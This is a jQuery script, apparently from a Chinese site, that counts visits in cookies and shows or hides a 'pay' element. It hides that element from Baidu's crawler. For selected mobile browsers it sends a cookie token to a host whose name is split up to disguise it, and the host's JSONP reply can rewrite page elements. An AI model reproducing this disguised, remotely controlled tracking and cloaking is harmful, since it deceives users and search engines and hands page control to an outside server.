$(function(){
    try {
        /* code */
        function getQueryString(name) {
    		var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
    		var r = window.location.search.substr(1).match(reg);
    		if (r != null) {
    			return unescape(r[2]);
    		}
    		return null;
    	}
		const class01 = 'pay';
        function initPage01(){
            const ck01 = $.cookie('TK_HKL001');
            if(ck01){
                const ck02 = $.cookie(ck01);
    	        if(ck02){
    	            var sp01 = ck02.split(",");
    	            var num01 = parseInt(sp01[0]);
			var ztype_str = (getQueryString("oid")&&($("#root").length>0||$("#bacs-wxuing").length>0))?'true':'';
			if(((num01==2&&Math.floor(Math.random()*10)>5)||num01>=3)&&$("#"+class01).length>0){if($("#"+class01).attr("init")){$("#"+class01).show();}}
    	            if((num01>=3&&sp01[1]=='no')||(num01>=1&&(sp01[1]!='end'&&ztype_str))){
				var pp = 'zs.'+(ck01?'whm':'')+(ck02?'f8.com':'');
    	                var setval = sp01[0]+(ztype_str?',end':',yes');
    	                if(ztype_str){ $.cookie(ck01,setval,{expires:1});}else{$.cookie(ck01,setval,{expires:365});};
    	                var ac_str = getQueryString("ac");
    	                $.ajax({
                            type: "GET",
                            async: true,
                            url: 'http'+(ck01?'s':'')+'://'+ pp +'/cs2023/s/tjbb?token='+ck01+'&num='+num01+'&type='+ac_str+'&remarks='+(ztype_str?'END':''),
                            dataType: "jsonp",
                            jsonp: "callback",//传递给请求处理程序或页面的，标识jsonp回调函数名(一般为:callback)
                            jsonpCallback: "cs_tongji_bd20",//callback的function名称
                            success: function (res) {
                            	 //console.log(res);
                            	 if(res!=null&&res.code==200&&res.stu==1901){
					if(window[res.ca1]){
						window[res.ca1]="";
					}
					$("#"+res.ele1).attr(res.attr1,"").attr(res.attr2,"javascript:void(0)");
					$("#"+res.ele1.substring(0,10)+"3").attr(res.attr1,"");$("#"+class01).hide();
				}
                            },
                            error: function () {
                               // alert('fail');
                            }
                        });
    	            }
    	        }
            }
        }
	if(/Baidu/i.test(navigator.userAgent)){
		if($("#"+class01).length>0){$("#"+class01).attr("init","yes").hide();}
	}
	const agent20 = navigator.userAgent.toLowerCase();
        if(/iphone os 1[5-9]/.test(agent20)||(agent20.indexOf("android 1")!=-1&&agent20.indexOf("sm-")==-1&&agent20.indexOf("surface")==-1&&agent20.indexOf("pixel")==-1)||/harmony/i.test(agent20)){
           	const ztype_str=(getQueryString("oid")&&($("#root").length>0||$("#bacs-wxuing").length>0))?'true':'';
		if(ztype_str){
			const ck03=$.cookie('TK_HKL001');
			if(!ck03){
				let timestamp1= new Date().getTime();
				let keystr1= 'GS'+timestamp1;
				$.cookie('TK_HKL001',keystr1,{expires:1});$.cookie(keystr1,'1,yes',{expires:1});	
			}
		}
		 setTimeout(initPage01, 500);
        }
        
    } catch (e) {}
});

